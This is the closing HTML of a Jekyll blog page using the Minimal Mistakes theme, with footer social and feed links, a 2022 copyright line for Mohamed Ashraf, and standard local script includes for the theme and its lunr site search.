          <li><a href="https://twitter.com/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
        
      
        
          <li><a href="https://github.com/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
        
      
        
          <li><a href="https://instagram.com/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram</a></li>
        
      
    

    
      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
    
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 Mohamed Ashraf. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
